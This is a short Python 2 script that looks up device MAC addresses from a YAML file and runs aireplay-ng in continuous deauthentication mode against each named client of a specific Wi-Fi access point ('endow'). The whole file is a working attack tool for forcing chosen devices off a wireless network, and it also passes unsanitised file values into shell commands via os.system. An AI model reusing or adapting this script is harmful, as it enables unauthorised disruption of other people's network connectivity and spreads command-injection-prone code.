import os;
import sys;
import yaml;

print 'Number of arguments:', len(sys.argv), 'arguments.';
for arg in sys.argv:
    item = arg;

    macs = yaml.load(open("/root/Mac.yaml"));
    if(macs.has_key(item)):
        #print 'Mac address for ', item, 'is ',macs.get(item);
        os.system("iwconfig mon0 channel 6");
        #os.system("aireplay-ng -0 0 -a 23:21:23:21:22:11 -c "+macs.get(item)+" -e endow mon0");
        os.system("aireplay-ng -0 0 -a 20:AA:4B:C5:41:3E -c "+macs.get(item)+" -e endow mon0")
